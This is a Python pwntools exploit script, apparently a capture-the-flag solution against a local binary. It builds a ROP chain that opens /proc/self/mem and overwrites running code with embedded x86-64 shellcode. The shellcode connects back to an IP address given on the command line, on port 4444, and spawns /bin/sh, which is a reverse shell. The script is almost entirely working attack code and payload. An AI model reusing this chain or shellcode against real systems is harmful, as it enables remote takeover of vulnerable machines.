#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.binary = "./load-ef05273401f331748cca5fcb8b14c43f80600adf4266fee4e5f250730b503f0c"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def common_gadgets(func, rdx, rsi, edi):
    return flat(0x400A6A, 0, 1, func, rdx, rsi, edi, 0x400A50, cyclic(56))

io = process("./load-ef05273401f331748cca5fcb8b14c43f80600adf4266fee4e5f250730b503f0c")
elf = context.binary 


sc = "\x68" + binary_ip(sys.argv[1]) + "\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05";
print disasm(sc)
 
name = "/proc/self/fd/0\0"
name += "/proc/self/mem\0"
#  print len(name)
name += sc

assert len(name) < 128
io.sendlineafter("name: ", name)
io.sendlineafter("offset: ", "0")
io.sendlineafter("size: ", str(0x400))

filename = 0x601040
prdi = 0x0000000000400a73 
pprsi = 0x0000000000400a71 
target = 0x4008A9

rop = cyclic(0x30 + 8)
rop += flat(prdi, filename + len("/proc/self/fd/0\0"), pprsi, 2, 0, elf.plt['open']) # open("/proc/self/mem", 2) -> fd = 0
rop += flat(prdi, filename + len("/proc/self/fd/0\0"), pprsi, 2, 0, elf.plt['open']) # open("/proc/self/mem", 2) -> fd = 1
rop += common_gadgets(elf.got['lseek'], 0, target, 1)
rop += flat(prdi, filename + len(name) - len(sc), elf.plt['puts']) # puts(sc) -> /proc/self/mem
rop += p64(target)

DEBUG([0x4008A8, 0x400A6A])
assert len(rop) < 0x400
io.send(rop)

io.interactive()
